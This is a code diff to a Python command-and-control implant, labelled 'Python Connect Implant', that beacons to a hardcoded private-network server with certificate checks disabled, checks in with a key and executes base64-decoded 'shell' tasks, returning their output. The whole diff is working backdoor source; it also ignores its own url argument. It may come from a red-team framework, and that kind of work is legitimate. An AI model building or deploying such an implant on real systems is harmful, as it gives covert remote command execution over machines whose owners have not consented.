@@ -1,3 +1,4 @@
+import argparse
 import base64
 import json
 import random
@@ -5,6 +6,7 @@ import requests
 import subprocess
 import sys
 import time
+import urllib3
 
 from collections import namedtuple
 
@@ -12,6 +14,15 @@ AgentOption = namedtuple('AgentOption', ['name', 'description', 'parameters','ty
 Parameter = namedtuple('Parameter', ['name', 'description'])
 
 routes = ['the', 'bird', 'is', 'a', 'nerd', 'd', 'juice']
+
+def base64_to_string(data) -> str:
+    """
+    Base64 decode a string.
+    :param data: A base64 string.
+    :return: A base64 decoded string
+    :rtype: str
+    """
+    return base64.b64decode(data.encode('utf-8')).decode('utf-8')
 
 def string_to_base64(data) -> str:
     """
@@ -22,24 +33,24 @@ def string_to_base64(data) -> str:
     """
     return str(base64.b64encode(data.encode()), 'utf-8')
 
-def post(data, route=''):
+def post(url, data, route=''):
     if not route:
         route = routes[random.randint(0, len(routes) - 1)]
-    return requests.post(f'http://127.0.0.1:8080/{route}', data).text
+    return requests.post(f'https://192.168.1.15:8080/{route}', data, verify=False).text
 
 
-def main():
+def main(url, key):
     batch_response = ''
     check_in_task_id = ''
     while True:
         try:
             if not check_in_task_id:
-                route = 'tPgWsiyxWd'
+                route = key
                 data = ''
             else:
                 route = ''
                 data = json.dumps(batch_response)
-            batch_request = json.loads(post(data, route=route))
+            batch_request = json.loads(post(url, data, route=route))
         except Exception as e:
             batch_response = [{
                 "connectrpc": "0.0.0",
@@ -55,16 +66,19 @@ def main():
         try:
             batch_response = []
             for task in batch_request:
+                print(task)
                 id = task['id']
                 name = task['name']
                 parameters = task['parameters']
                 results = ''
+                parameters = [base64_to_string(parameter) for parameter in parameters]
                 try:
                     if name == 'check_in':
                         check_in_task_id = id
                         continue
                     if name == 'shell':
-                        results = subprocess.check_output(parameters[0], stderr=subprocess.STDOUT, shell=True, encoding='UTF-8')
+                        print(parameters)
+                        results = subprocess.run(parameters, capture_output=True, text=True).stdout
                     if not results:
                         batch_response.extend([{
                             "connectrpc": "0.0.0",
@@ -106,4 +120,9 @@ def main():
         time.sleep(random.randint(5, 10))
 
 if __name__ == '__main__':
-    sys.exit(main())
+    parser = argparse.ArgumentParser('Python Connect Implant', 'Python Connect Implant', conflict_handler='resolve')
+    parser.add_argument('url', metavar='url', help='Server URL')
+    parser.add_argument('key', metavar='key', help='Implant Key')
+    args = parser.parse_args()
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    sys.exit(main(args.url, args.key))
